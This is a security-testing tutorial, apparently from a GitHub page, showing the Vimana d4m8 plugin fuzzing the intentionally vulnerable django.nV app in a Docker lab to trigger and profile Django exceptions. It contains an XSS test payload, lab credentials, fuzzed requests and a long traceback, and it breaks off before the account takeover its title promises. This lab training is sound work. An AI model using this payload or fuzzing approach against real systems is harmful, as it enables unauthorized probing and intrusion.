# Enumeration and Account Takeover via Exception Profiling fuzzing


`vimana list --plugins` 
![image](https://github.com/user-attachments/assets/d846a465-7c05-47dd-9449-17b11350c308)
`vimana info --plugin d4m8` 
![image](https://github.com/user-attachments/assets/f5b46282-5207-41c8-9e5a-3ef896441ea2)
`vimana guide --plugin d4m8 --args`
![image](https://github.com/user-attachments/assets/610acd0c-2064-4d9c-a105-ffeb1e90cae4)
`vimana guide --plugin d4m8 --examples`
![image](https://github.com/user-attachments/assets/c5222830-e4f5-4a69-a269-aac20450e28a)

### Lab Setup

Before that, let's start up a lab to run D4M8 against it. In this guide we'll using django.nV, a purposefully vulnerable Django application provided by nVisium.
If you prefer, you can follow the steps in the projects to run it locally on your host machine, but I would definitely recommend you to containerized it, for security reasons, of course.
The easiest way to do that is by copy and pasting it directly in your Linux terminal (after carefully checking those commands of course):
```yaml
{
echo "üöÄ Configurando django.nV..."

# Dockerfile
cat > Dockerfile << 'DOC'
FROM python:3.8-slim
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y git build-essential sqlite3 curl && rm -rf /var/lib/apt/lists/*
WORKDIR /app
RUN git clone https://github.com/NetSPI/django.nV.git . && echo "‚úÖ Projeto clonado!"
RUN pip install --upgrade pip && pip install -r requirements.txt && echo "‚úÖ Depend√™ncias instaladas!"
RUN chmod +x reset_db.sh runapp.sh && sed -i 's/\r$//' reset_db.sh runapp.sh
RUN ./reset_db.sh && echo "‚úÖ Banco configurado!"
RUN python manage.py shell -c "from django.contrib.auth.models import User; User.objects.create_superuser('admin', 'admin@example.com', 'admin123') if not User.objects.filter(username='admin').exists() else print('Admin existe')" || echo "Admin OK"
RUN python manage.py collectstatic --noinput || echo "Static OK"
RUN python manage.py check && echo "‚úÖ Tudo OK!"
EXPOSE 8000
CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]
DOC

# docker-compose.yml
cat > docker-compose.yml << 'COMPOSE'
version: '3.8'
services:
  django-nv:
    build: .
    container_name: django-nv-app
    ports:
      - "8000:8000"
    environment:
      - DEBUG=1
    depends_on:
      - mailhog
    restart: unless-stopped
  mailhog:
    image: mailhog/mailhog:latest
    container_name: django-nv-mailhog
    ports:
      - "1025:1025"
      - "8025:8025"
    restart: unless-stopped
COMPOSE

echo "‚úÖ Arquivos criados!"
echo "üîß Iniciando docker-compose..."
docker-compose up --build

} && echo "üéâ Setup conclu√≠do! Acesse http://localhost:8000 (admin/admin123)"
```
If everything goes without problem you'll now have the following resources:

```
üåê URLs:

TaskManager Application: http://localhost:8000
Tutorials: http://localhost:8000/taskManager/tutorials/
MailHog: http://localhost:8025
Login: admin / admin123
```
Accessing the application URL http://localhost:8000 you'll see this main page:
![image](https://github.com/user-attachments/assets/7d96db41-a124-4970-9daa-a77fc09b70ad)

To register a new user, go to http://localhost:8000/taskManager/register/. Go ahead and add some users, remember to take note of their emails.
![image](https://github.com/user-attachments/assets/8bd94456-2fb8-4419-afb5-f57f7cf1e531)

![image](https://github.com/user-attachments/assets/18f84116-a90f-4865-9db7-bdb6ecef2019)

### Running D4M8 initial analysis
`vimana run plugin d4m8 --target-url http://localhost:8000`

#### DMT - Scope Enriching step
![image](https://github.com/user-attachments/assets/b3a89b53-7c14-4158-8dd2-3c2eb5ce7a20)
![image](https://github.com/user-attachments/assets/71a4491a-103c-43a3-b02d-50a74899380c)



#### ViWeC - Web Crawler step 
![image](https://github.com/user-attachments/assets/7b285844-8683-4bec-b154-b8379cb8a8cc)

<details>
<summary>Show full Crawler Output</summary>

```python

      .   .   .
    . ^ . ^ . ^ .     
  _/|\_/|\_/|\_/|\_   
 / \./ \./ \./ \./ \  vimana
(-V-|-1-|-W-|-3-|-C-) web
 \_/.\_/.\_/.\_/.\_/  crawler
   \|/*\|/*\|/*\|/
    .   .   .   .
       
  


    

[2025-06-14 16:37:39.256687] ‚Üí Starting viwec against 1 inital URLs 
„Äê200„Äë‚ä∂  http://localhost:8000
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
    + http://localhost:8000/taskManager/register
„Äê200„Äë‚ä∂  http://localhost:8000
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
    + http://localhost:8000/taskManager/register
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/register/
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/login/
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
    + http://localhost:8000/taskManager/tutorials/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/forgot_password
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/forgot_password/
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
    + http://localhost:8000/taskManager/tutorials/redirects/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/injection/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/brokenauth/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/injection/#accordion1_1
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/brokenauth/#accordion1_1
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/injection/#accordion1_2
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/xss/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/brokenauth/#accordion1_2
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/idor/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/injection/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/misconfig/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/brokenauth/#accordion1_3
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/exposure/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/access/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/injection/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/misconfig/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/csrf/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/xss/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/components/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/brokenauth/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/redirects/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/exposure/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/idor/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/misconfig/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/xss/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/redirects/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/exposure/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/idor/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/access/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/misconfig/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/csrf/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/xss/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/components/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/redirects/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/exposure/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/idor/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/access/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/misconfig/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/csrf/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/xss/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/components/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/redirects/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/exposure/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/idor/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/access/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/csrf/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/components/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/redirects/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/access/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/csrf/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/components/#accordion1_4


```
</details>

#### D4M8 Fuzzing 
After enriched the scope, the plugin will then start the tests. As you can see in the image below, we're about to start d4m8 plugin with a initial scope of 109 URLs, when we've informed just the target URL.
As soon as we have our first exception triggered, we'll then see the detailed information about the request and response in that step.
![image](https://github.com/user-attachments/assets/edf883c5-c3cf-4de3-9468-12c0f8712854)

Here the plugin is attempting to send the form found in `taskmanager/reset_password/` endpoint with empty values:
```
       Content-Type: application/x-www-form-urlencoded
            Referer: http://localhost:8000/taskManager/reset_password/
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en
    Accept-Encoding: gzip, deflate, br, zstd
             Cookie: csrftoken=B1QUduZznOLpQbUr0lqYcbl9V8nwVt3d; sessionid=gAV9lC4:1uQA6G:BXfWWHnkAsalKZaMm3iOfaURJ7M
       csrfmiddlewaretoken: None

        reset_token: ""
       new_password: ""
   confirm_password: ""
```
to check the response, and with that, we can see below we've triggered an MultipleObjectsReturned exception:

![image](https://github.com/user-attachments/assets/cafc6d94-d7b5-4839-bf02-a68d6d24c675)

We have all the variables and their respective values in that exception traceback, and at this point, nothing particularly interesting inside this MultipleObjectsReturned dump.

![image](https://github.com/user-attachments/assets/2ebb7b93-379c-489c-903f-c225bc7f5b76)

### Exception Profiles
<task_note>This is a key feature in Vimana Framework ecosystem. We'll later present all those tracebacks on the front end with an automatic correlation between exception details and certain vulnerabilities.


</task_note>

Some exceptions are more critical than others, and that's important because later we'll create some rules where we can specify the target exception we're looking for.
As a simple example, we can say that usually, a ValueError is less interesting than an IntegrityError. Below you can see why:
![image](https://github.com/user-attachments/assets/5f4fdcbd-db3c-46f9-a62c-35d57b2a7f81)

and here the specific trigger affecting the taskManager module itself, where the ValueError was triggered:
![image](https://github.com/user-attachments/assets/82087dcc-23bc-4833-92d1-acf5b804c065)

As you can see, it's all about this part:
```Python
         Line trigger: 331   int(request.POST.get('project_duedate', False))))
```
which become like this with our test payload:
```Python
         Line trigger: 331   int("<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>")
```
And that's not possible throwing a ValueError. In this case, once you're already now what you're looking for, you can just skip all occurrencies of ValueError running:
```
vimana run d4m8 --target-url http://127.0.0.1:8000 --skip-exception ValueError
```

On the other hand, below we have a IntegrityError exception dump, take a close look at it:

![image](https://github.com/user-attachments/assets/b9b1a0ab-304c-4860-8bf8-de9759c0179d)


<details>
<summary>Show full Traceback</summary>

```python
 ‚Æö              Request                       

       Content-Type: application/x-www-form-urlencoded
            Referer: http://localhost:8000/taskManager/project_create/
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en
    Accept-Encoding: gzip, deflate, br, zstd
             Cookie: csrftoken=B1QUduZznOLpQbUr0lqYcbl9V8nwVt3d; sessionid=gAV9lC4:1uQA6G:BXfWWHnkAsalKZaMm3iOfaURJ7M
       csrfmiddlewaretoken: None

                  q: 1-false
csrfmiddlewaretoken: B1QUduZznOLpQbUr0lqYcbl9V8nwVt3d

	   <input type="text" name="q" class="form-control search" placeholder="Search">text">                                   
	   <input type="hidden" name="csrfmiddlewaretoken" value="B1QUduZznOLpQbUr0lqYcbl9V8nwVt3d">
	   <input name="title" class="form-control" placeholder="">
	   <input name="project_duedate" class="form-control" id="datetimepicker" type="text">

 ‚Æò             Response                       

               Date: Fri, 13 Jun 2025 22:25:43 GMT
             Server: WSGIServer/0.2 CPython/3.8.20
       Content-Type: text/html
    X-Frame-Options: SAMEORIGIN
               Vary: Cookie

    IntegrityError 

             Reason: A violation of a Django database relation occurred
           Category: Database Exceptions
     Request Method: POST
        Request URL: http://localhost:8000/taskManager/project_create/
     Django Version: 1.8.3
    Exception Value: ['NOT NULL constraint failed: taskManager_project_users_assigned.user_id']
 Exception Location: /usr/local/lib/python3.8/site-packages/django/db/backends/sqlite3/base.py in execute, line 318
  Python Executable: /usr/local/bin/python
     Python Version: 3.8.20
        Python Path: ['/app\n /usr/local/lib/python38.zip\n /usr/local/lib/python3.8\n /usr/local/lib/python3.8/lib-dynload\n /usr/local/lib/python3.8/site-packages']
        Server time: Fri, 13 Jun 2025 22:25:43 +0000

          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/core/handlers/base.py
             Function: get_response
         Line trigger: 132   response = wrapped_callback(request, *callback_args, **callback_kwargs)

                  ‚óé  vars 

                     self: <django.core.handlers.wsgi.WSGIHandler object at 0x7fa378569ee0>
                  urlconf: 'taskManager.urls'
                 resolver: <RegexURLResolver 'taskManager.urls' (None:None) ^/>
                 response: None
        middleware_method: <bound method CsrfViewMiddleware.process_view of <django.middleware.csrf.CsrfViewMiddleware object at 0x7fa37716dfd0>>
           resolver_match: ResolverMatch(func=taskManager.views.project_create, args=(), kwargs={}, url_name=project_create, app_name=None, namespaces=['taskManager'])
                 callback: <function project_create at 0x7fa3770afee0>
            callback_args: ()
          callback_kwargs: {}
         wrapped_callback: <function project_create at 0x7fa3770afee0>
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/fields/related.py
             Function: __set__
         Line trigger: 1274   manager.add(*value)

                  ‚óé  vars 

                     self: <django.db.models.fields.related.ReverseManyRelatedObjectsDescriptor object at 0x7fa377578ee0>
                 instance: Error in formatting: TypeError: __str__ returned non-string (type bool)
                    value: (None,)
                  manager: <django.db.models.fields.related.create_many_related_manager.<locals>.ManyRelatedManager object at 0x7fa3771f36a0>
                       db: 'default'
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/fields/related.py
             Function: add
         Line trigger: 984   self._add_items(self.source_field_name, self.target_field_name, *objs)

                  ‚óé  vars 

                     self: <django.db.models.fields.related.create_many_related_manager.<locals>.ManyRelatedManager object at 0x7fa3771f36a0>
                     objs: (None,)
                       db: 'default'
                      rel: <ManyToManyRel: taskManager.project>
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/fields/related.py
             Function: _add_items
         Line trigger: 1103   self.through._default_manager.using(db).bulk_create([

                  ‚óé  vars 

                     objs: (None,)
                    Model: <class 'django.db.models.base.Model'>
                  new_ids: {None}
                      obj: None
                       db: 'default'
                     vals: []
                     self: <django.db.models.fields.related.create_many_related_manager.<locals>.ManyRelatedManager object at 0x7fa3771f36a0>
        source_field_name: 'project'
        target_field_name: 'user'
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/query.py
             Function: bulk_create
         Line trigger: 392   self._batched_insert(objs_without_pk, fields, batch_size)

                  ‚óé  vars 

                     self: [<Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>]
                     objs: [<Project_users_assigned: Project_users_assigned object>]
               batch_size: None
               connection: <django.db.backends.sqlite3.base.DatabaseWrapper object at 0x7fa37710b490>
                   fields: [<django.db.models.fields.related.ForeignKey: project>, <django.db.models.fields.related.ForeignKey: user>]
             objs_with_pk: []
          objs_without_pk: [<Project_users_assigned: Project_users_assigned object>]
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/query.py
             Function: _batched_insert
         Line trigger: 936   self.model._base_manager._insert(batch, fields=fields,

                  ‚óé  vars 

                     self: [<Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>]
                   fields: [<django.db.models.fields.related.ForeignKey: project>, <django.db.models.fields.related.ForeignKey: user>]
                      ops: <django.db.backends.sqlite3.operations.DatabaseOperations object at 0x7fa37710bfd0>
                    batch: [<Project_users_assigned: Project_users_assigned object>]
               batch_size: 499
                     objs: [<Project_users_assigned: Project_users_assigned object>]
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/manager.py
             Function: manager_method
         Line trigger: 127   return getattr(self.get_queryset(), name)(*args, **kwargs)

                  ‚óé  vars 

                     self: <django.db.models.manager.Manager object at 0x7fa377578f70>
                     args: ([<Project_users_assigned: Project_users_assigned object>],)
                   kwargs: {'fields': [<django.db.models.fields.related.ForeignKey: project>,            <django.db.models.fields.related.ForeignKey: user>], 'using': 'default'}
                     name: '_insert'
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/query.py
             Function: _insert
         Line trigger: 920   return query.get_compiler(using=using).execute_sql(return_id)

                  ‚óé  vars 

                     self: [<Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>]
                     objs: [<Project_users_assigned: Project_users_assigned object>]
                   fields: [<django.db.models.fields.related.ForeignKey: project>, <django.db.models.fields.related.ForeignKey: user>]
                return_id: False
                      raw: False
                    using: 'default'
                    query: <django.db.models.sql.subqueries.InsertQuery object at 0x7fa35ef9ea60>
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/sql/compiler.py
             Function: execute_sql
         Line trigger: 974   cursor.execute(sql, params)

                  ‚óé  vars 

                     self: <django.db.models.sql.compiler.SQLInsertCompiler object at 0x7fa35ef9e130>
                return_id: False
                   cursor: <django.db.backends.utils.CursorDebugWrapper object at 0x7fa35ef9ec10>
                      sql: ('INSERT INTO "taskManager_project_users_assigned" ("project_id", "user_id") ' 'SELECT %s AS "project_id", %s AS "user_id"')
                   params: (32, None)
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/backends/utils.py
             Function: execute
         Line trigger: 79   return super(CursorDebugWrapper, self).execute(sql, params)

                  ‚óé  vars 

                     self: <django.db.backends.utils.CursorDebugWrapper object at 0x7fa35ef9ec10>
                      sql: ('QUERY = \'INSERT INTO "taskManager_project_users_assigned" ("project_id", ' '"user_id") SELECT %s AS "project_id", %s AS "user_id"\' - PARAMS = (32, ' 'None)')
                   params: (32, None)
                    start: 1749853543.4822485
                     stop: 1749853543.4823608
                 duration: 0.00011229515075683594
                __class__: <class 'django.db.backends.utils.CursorDebugWrapper'>
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/backends/utils.py
             Function: execute
         Line trigger: 64   return self.cursor.execute(sql, params)

                  ‚óé  vars 

                     self: <django.db.backends.utils.CursorDebugWrapper object at 0x7fa35ef9ec10>
                      sql: ('INSERT INTO "taskManager_project_users_assigned" ("project_id", "user_id") ' 'SELECT %s AS "project_id", %s AS "user_id"')
                   params: (32, None)
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/utils.py
             Function: __exit__
         Line trigger: 97   six.reraise(dj_exc_type, dj_exc_value, traceback)

                  ‚óé  vars 

                     self: <django.db.utils.DatabaseErrorWrapper object at 0x7fa3771f3220>
                 exc_type: <class 'sqlite3.IntegrityError'>
                exc_value: IntegrityError('NOT NULL constraint failed: taskManager_project_users_assigned.user_id')
                traceback: <traceback object at 0x7fa3771daf00>
              dj_exc_type: <class 'django.db.utils.IntegrityError'>
              db_exc_type: <class 'sqlite3.IntegrityError'>
             dj_exc_value: IntegrityError('NOT NULL constraint failed: taskManager_project_users_assigned.user_id')
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/utils/six.py
             Function: reraise
         Line trigger: 658   raise value.with_traceback(tb)

                  ‚óé  vars 

                       tp: <class 'django.db.utils.IntegrityError'>
                    value: IntegrityError('NOT NULL constraint failed: taskManager_project_users_assigned.user_id')
                       tb: <traceback object at 0x7fa3771daf00>
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/backends/utils.py
             Function: execute
         Line trigger: 64   return self.cursor.execute(sql, params)

                  ‚óé  vars 

                     self: <django.db.backends.utils.CursorDebugWrapper object at 0x7fa35ef9ec10>
                      sql: ('INSERT INTO "taskManager_project_users_assigned" ("project_id", "user_id") ' 'SELECT %s AS "project_id", %s AS "user_id"')
                   params: (32, None)
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/backends/sqlite3/base.py
             Function: execute
         Line trigger: 318   return Database.Cursor.execute(self, query, params)

                  ‚óé  vars 

                     self: <django.db.backends.sqlite3.base.SQLiteCursorWrapper object at 0x7fa35f7c1040>
                    query: ('INSERT INTO "taskManager_project_users_assigned" ("project_id", "user_id") ' 'SELECT ? AS "project_id", ? AS "user_id"')
                   params: (32, None)
          ‚û§  Trigger 

               Module: /app/taskManager/views.py
             Function: project_create
         Line trigger: 339   project.users_assigned = [request.user.id]

                  ‚óé  vars 

                    title: False
                     text: False
         project_priority: 0
                      now: datetime.datetime(2025, 6, 13, 22, 25, 43, 438943, tzinfo=<UTC>)
